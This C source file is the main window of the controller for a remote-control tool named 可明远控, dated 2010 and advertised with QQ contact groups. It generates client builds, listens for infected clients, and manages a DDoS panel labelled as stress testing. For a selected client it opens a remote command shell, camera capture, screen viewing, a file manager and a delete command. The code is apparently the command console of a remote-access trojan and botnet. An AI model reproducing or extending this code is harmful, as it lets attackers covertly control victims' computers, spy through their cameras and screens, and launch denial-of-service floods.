/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "main_frame.h"
#include "resource.h"
#include "km_socket.h"
#include "main_frame_client_op.h"
#include "main_frame_ddos.h"
#include "main_frame_log.h"

#include "m_frame_file.h"
#include "m_frame_screen.h"
#include "m_frame_cap_screen.h"
#include "m_make_file.h"
#include "m_make_center.h"

HMENU       hMenuFrame;
HWND        hWnd;
HWND        hWndList,hWndDDOSList,hWndLogList,hWndTools,hWndT,hWndStatus;

HIMAGELIST  hImageList;
extern      HINSTANCE   hInst;
extern      long g_totalline;
extern      long g_lineport;
extern      long g_cmdport;
extern      int listview_ddos_item_type;

//pio_socket g_a_io_handle;
//extern      char g_exec_cmd[1024];

pio_socket g_cur_pio_handle = NULL;

int initialize_main_frame_tool(HWND hWnd)
{
    hWndTools   = CreateWindowEx(0, TOOLBARCLASSNAME, NULL, WS_VISIBLE|WS_CHILD|TBSTYLE_FLAT, 0, 0, 50, 100, hWnd, (HMENU)IDR_TOOLBAR1, hInst, NULL);

    SendMessage(hWndTools, TB_BUTTONSTRUCTSIZE, sizeof(TBBUTTON), 0);

    //char t1[] = "中心端设置";
    char t1[] = "客户端生成";
    char t2[] = "客户端列表";
    char t3[] = "压力测试";
    char t4[] = "日志";
    char t5[] = "关于可明远控";

    TBBUTTON thb[5];
    thb[0].iBitmap      = 0;
    thb[0].fsState      = TBSTATE_ENABLED;
    thb[0].fsStyle      = TBSTYLE_BUTTON;
    thb[0].dwData       = 0;
    thb[0].idCommand    = IDM_MENU_MAKE_FILE;
    thb[0].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t1);

    thb[1].iBitmap      = 1;
    thb[1].fsState      = TBSTATE_ENABLED;
    thb[1].fsStyle      = TBSTYLE_BUTTON;
    thb[1].dwData       = 0;
    thb[1].idCommand    = IDR_COMMAND2;
    thb[1].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t2);

    thb[2].iBitmap      = 1;
    thb[2].fsState      = TBSTATE_ENABLED;
    thb[2].fsStyle      = TBSTYLE_BUTTON;
    thb[2].dwData       = 0;
    thb[2].idCommand    = IDR_COMMAND3;
    thb[2].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t3);

    thb[3].iBitmap      = 1;
    thb[3].fsState      = TBSTATE_ENABLED;
    thb[3].fsStyle      = TBSTYLE_BUTTON;
    thb[3].dwData       = 0;
    thb[3].idCommand    = IDR_COMMAND4;
    thb[3].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t4);

    thb[4].iBitmap      = 1;
    thb[4].fsState      = TBSTATE_ENABLED;
    thb[4].fsStyle      = TBSTYLE_BUTTON;
    thb[4].dwData       = 0;
    thb[4].idCommand    = IDR_COMMAND5;
    thb[4].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t5);

    /*thb[5].iBitmap      = 1;
    thb[5].fsState      = TBSTATE_ENABLED;
    thb[5].fsStyle      = TBSTYLE_BUTTON;
    thb[5].dwData       = 0;
    thb[5].idCommand    = IDR_COMMAND5;
    thb[5].iString      = SendMessage(hWndTools, TB_ADDSTRING, (WPARAM) 0, (LPARAM) (LPSTR) t6);*/

    SendMessage(hWndTools, TB_ADDBUTTONS, (WPARAM)5, (LPARAM)(LPTBBUTTON)&thb);
    SendMessage(hWndTools, TB_AUTOSIZE, 0, 0);
    SendMessage(hWndTools, TB_SETEXTENDEDSTYLE, (WPARAM) 0, (LPARAM) (DWORD)TBSTYLE_EX_DRAWDDARROWS|TBSTYLE_EX_DOUBLEBUFFER|TBSTYLE_EX_HIDECLIPPEDBUTTONS );
    ShowWindow(hWndTools, SW_SHOW);

    HIMAGELIST hHotImageList = ImageList_Create(32, 32, ILC_COLOR32 |ILC_MASK , 1, 0);
    ImageList_AddIcon(hHotImageList,LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON1)));
    ImageList_AddIcon(hHotImageList,LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON2)));
    SendMessage(hWndTools, TB_SETIMAGELIST, 0, (LPARAM)hHotImageList);

    hWndStatus = CreateStatusWindow(WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN, "", hWnd, 0);
    return 0;
}

LRESULT __stdcall main_frame_proc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    switch(Message)
    {
    case WM_CREATE:
        {
            char status[256];
            SetClassLong(hWnd, GCL_HICON, (LONG)LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON1)));

            hMenuFrame = LoadMenu(hInst, MAKEINTRESOURCE(IDR_MENU3));
            hMenuFrame = GetSubMenu(hMenuFrame, 0);

            hWndList    = CreateWindowEx(WS_EX_CLIENTEDGE, WC_LISTVIEW, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|LVS_REPORT, 210, 30, 200, 100, hWnd, (HMENU)IDR_LISTVIEW, hInst, NULL);
            SendMessage(hWndList, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, 0x20);

            hWndDDOSList = CreateWindowEx(WS_EX_CLIENTEDGE, WC_LISTVIEW, NULL, WS_CHILD|WS_CLIPCHILDREN|LVS_REPORT, 210, 30, 200, 100, hWnd, (HMENU)IDR_DDOS_LISTVIEW, hInst, NULL);
            SendMessage(hWndDDOSList, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, 0x20);

            hWndLogList = CreateWindowEx(WS_EX_CLIENTEDGE, WC_LISTVIEW, NULL, WS_CHILD|WS_CLIPCHILDREN|LVS_REPORT, 210, 30, 200, 100, hWnd, (HMENU)NULL, hInst, NULL);
            SendMessage(hWndLogList, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, 0x20);

            hImageList = ImageList_Create(20, 20, ILC_COLOR32 |ILC_MASK , 1, 0);
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON1)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON2)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON3)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON4)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_CLIENT_LIST_ICON5)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_FILE_DOWN)));
            ImageList_AddIcon(hImageList, LoadIcon(hInst, MAKEINTRESOURCE(IDI_FILE_UP)));

            ListView_SetImageList(hWndList, hImageList, LVSIL_SMALL);

            initialize_main_frame_tool(hWnd);

            main_frame_draw_client_list_col();
            main_frame_draw_ddos_col();
            main_frame_draw_log_col();

            int x = (GetSystemMetrics(SM_CXSCREEN)-800)/2;
            int y = (GetSystemMetrics(SM_CYSCREEN)-400)/2;
            MoveWindow(hWnd, x, y, 800, 400, TRUE);

            initialize_frame_file();
            initialize_frame_screen();
            initialize_frame_cap_screen();

            _log("中心端启动完毕,开始监听端口%d..", g_lineport);
            if (!kms_sock_listen(g_lineport, (f_work)km_main_accept)) {
                _log("监听端口%d失败,请检查该端口是否被占用,然后重新启动中心端..", g_lineport);
            }

            sprintf(status, "当前监听端口[%d],有[%d]台客户端在线", (int)g_lineport, (int)g_totalline);
            SetWindowText(hWndStatus, status);
        }
        break;
    case WM_SIZE:
        {
            RECT rect,tool,status;
            GetClientRect(hWnd, &rect);
            GetClientRect(hWndTools, &tool);
            GetClientRect(hWndStatus, &status);
            tool.bottom = tool.bottom + 4;

            HDWP hDwp;
            hDwp  = BeginDeferWindowPos(5);

            DeferWindowPos(hDwp, hWndList, NULL, 0, tool.bottom, rect.right, rect.bottom-tool.bottom-status.bottom, SWP_NOZORDER);
            DeferWindowPos(hDwp, hWndDDOSList, NULL, 0, tool.bottom, rect.right, rect.bottom-tool.bottom-status.bottom, SWP_NOZORDER);
            DeferWindowPos(hDwp, hWndLogList, NULL, 0, tool.bottom, rect.right, rect.bottom-tool.bottom-status.bottom, SWP_NOZORDER);

            DeferWindowPos(hDwp, hWndTools, NULL, 0, 0, 0, 0, SWP_NOZORDER);
            DeferWindowPos(hDwp, hWndStatus, NULL, 0, 0, 0, 0, SWP_NOZORDER);
            EndDeferWindowPos(hDwp);

            main_frame_draw_client_list_col_width(rect.right-10);
            main_frame_draw_ddos_col_width(rect.right-10);
            main_frame_draw_log_col_width(rect.right-10);

        }
        break;
    case WM_COMMAND:
        {
            switch(LOWORD(wParam))
            {
            case IDM_MENU_MAKE_FILE:
                make_file_initialize(hWnd);
                break;
            case IDR_COMMAND1:
                make_center_initialize(hWnd);
                break;
            case IDM_EXIT1:
                SendMessage(hWnd, WM_DESTROY, 0, 0);
                break;
            case IDR_COMMAND2:
                ShowWindow(hWndList, SW_SHOW);
                ShowWindow(hWndDDOSList,SW_HIDE);
                ShowWindow(hWndLogList, SW_HIDE);
                break;
            case IDR_COMMAND3:
                //MessageBox(NULL, "测试版不包含此功能.", 0, 0);
                //break;
                ShowWindow(hWndList, SW_HIDE);
                ShowWindow(hWndDDOSList,SW_SHOW);
                ShowWindow(hWndLogList, SW_HIDE);
                break;
            case IDR_COMMAND4:
                ShowWindow(hWndList, SW_HIDE);
                ShowWindow(hWndDDOSList,SW_HIDE);
                ShowWindow(hWndLogList, SW_SHOW);
                break;
            case IDR_COMMAND5:
                MessageBox(hWnd, "可明远控(测试阶段),有任何问题请联系QQ:643358577,群:6467438", KM_NAME, MB_ICONQUESTION);
                break;
            case IDM_DDOS_START:
                main_frame_event_ddos_start();
                break;
            case IDM_DDOS_STOP:
                main_frame_event_ddos_stop();
                break;
            case IDM_DDOS_ADD:
                listview_ddos_item_type = 1;
                make_ddos_initialize(hWnd);
                break;
            case IDM_DDOS_EDIT:
                listview_ddos_item_type = 2;
                make_ddos_initialize(hWnd);
                break;
            case IDM_DDOS_DEL:
                listview_ddos_item_type = 3;
                main_frame_event_ddos_del();
                break;
            default:
                main_frame_right_menu(hWnd, Message, wParam, lParam);
            }
        }
        break;
    case WM_NOTIFY:
        {
            switch(LOWORD(wParam))
            {
            case IDR_TOOLBAR1:
                main_frame_event_notify_tools(hWnd, Message, wParam, lParam);
                break;
            case IDR_LISTVIEW:
                main_frame_event_notify_listview(hWnd, Message, wParam, lParam);
                break;
            case IDR_DDOS_LISTVIEW:
                main_frame_event_notify_ddos_listview(hWnd, Message, wParam, lParam);
                break;
            }
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hWnd, Message, wParam, lParam);
}

int initialize_main_frame()
{
    char cls[] = "mainframe";
    MSG         msg;
    WNDCLASSEX  wcx;

    InitCommonControls();

    wcx.cbSize          = sizeof(WNDCLASSEX);
    wcx.style           = CS_HREDRAW | CS_VREDRAW;
    wcx.cbClsExtra      = 0;
    wcx.cbWndExtra      = 0;
    wcx.hInstance       = NULL;
    wcx.hIcon           = LoadIcon(NULL,IDI_APPLICATION);
    wcx.hIconSm         = NULL;
    wcx.hCursor         = LoadCursor(NULL,IDC_ARROW);
    wcx.hbrBackground   = (HBRUSH)(COLOR_BACKGROUND);
    wcx.lpszMenuName    = (LPSTR)IDR_MENU1;
    wcx.lpszClassName   = cls;
    wcx.lpfnWndProc     = main_frame_proc;

    if (!RegisterClassEx(&wcx))
        return -1;

    hWnd = CreateWindowEx(0, cls, "可明远控(测试阶段),有任何问题请联系QQ:643358577,群:6467438", WS_OVERLAPPEDWINDOW|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, 0, 0, 500, 600, NULL, NULL, NULL, NULL);
    if (hWnd == NULL)
        return -1;

    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}

LRESULT __stdcall main_frame_event_notify_tools(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    #define lpnm   ((LPNMHDR)lParam)
    #define lpnmTB ((LPNMTOOLBAR)lParam)
    switch(lpnm->code)
    {
      case TBN_DROPDOWN:
          {
            if (lpnmTB->iItem == IDR_COMMAND2)
            {
                //MessageBox(NULL, "aa", 0, 0);

                RECT rc;
                TPMPARAMS tpm;
                SendMessage(lpnmTB->hdr.hwndFrom, TB_GETRECT, (WPARAM)lpnmTB->iItem, (LPARAM)&rc);
                //MapWindowPoints(lpnmTB->hdr.hwndFrom, HWND_DESKTOP, (LPPOINT)&rc, 2);
                tpm.cbSize = sizeof(TPMPARAMS);
                tpm.rcExclude = rc;
              //  hMenuLoaded = LoadMenu(hInst, MAKEINTRESOURCE(IDR_POPUP));
              //  hPopupMenu = GetSubMenu(LoadMenu(hInst,MAKEINTRESOURCE(IDR_POPUP)),0);
              //  TrackPopupMenuEx(hPopupMenu,TPM_LEFTALIGN|TPM_LEFTBUTTON|TPM_VERTICAL,rc.left, rc.bottom, hwnd, &tpm);
              //  DestroyMenu(hMenuLoaded);
            }
          }
    }
    return 0;
}

LRESULT __stdcall main_frame_event_notify_listview(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    #define lpnm ((LPNMHDR)lParam)
    switch(lpnm->code)
    {
    case NM_DBLCLK:
        {
            LV_DISPINFO *lpDis = (LV_DISPINFO*)lParam;
            char text1[50]={0};
            char text2[50]={0};
            ListView_GetItemText(lpnm->hwndFrom,lpDis->item.mask, 0, text1, 50);
            ListView_GetItemText(lpnm->hwndFrom,lpDis->item.mask, 1, text2, 50);
            g_cur_pio_handle = main_frame_client_find_addr(text1, text2);
            if (g_cur_pio_handle != NULL){
                create_frame_file(hWnd, g_cur_pio_handle);
            }
        }
        break;
    case NM_RCLICK:
        {
            g_cur_pio_handle = NULL;
            LV_DISPINFO *lpDis = (LV_DISPINFO*)lParam;
            char text1[50]={0};
            char text2[50]={0};
            ListView_GetItemText(lpnm->hwndFrom, lpDis->item.mask, 0, text1, 50);
            ListView_GetItemText(lpnm->hwndFrom, lpDis->item.mask, 1, text2, 50);
            g_cur_pio_handle = main_frame_client_find_addr(text1, text2);
            if (g_cur_pio_handle != NULL){
                POINT point;
                GetCursorPos(&point);
                TrackPopupMenu(hMenuFrame, TPM_RIGHTBUTTON, point.x, point.y, 0, hWnd, NULL);
            }
        }
        break;
    }
    return 0;
}

LRESULT __stdcall main_frame_right_menu(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    if (g_cur_pio_handle == NULL){
        return 0;
    }
    switch(LOWORD(wParam))
    {
    case IDM_FRAME_FILE:
        create_frame_file(hWnd, g_cur_pio_handle);
        break;
    case IDM_FRAME_CMD:
        {
            char km_cmd_exec[1024] = {0};
            kms_sock_send(g_cur_pio_handle, CLIENT_CMD, CLIENT_START_CMD, g_cmdport, NULL, 0);
            sprintf(km_cmd_exec, "%s %d", g_share_main->km_cmd_exec, (int)g_cmdport);
            WinExec(km_cmd_exec, SW_SHOW);
        }
        break;
    case IDM_FRAME_CAMERA:
        create_frame_cap_screen(hWnd, g_cur_pio_handle);
        break;
    case IDM_FRAME_SCREEN:
        create_frame_screen(hWnd, g_cur_pio_handle);
        break;
    case IDM_FRAME_DELETE:
        kms_sock_send(g_cur_pio_handle, 0, 6, 0, NULL, 0);
        break;
    }
    return 1;
}
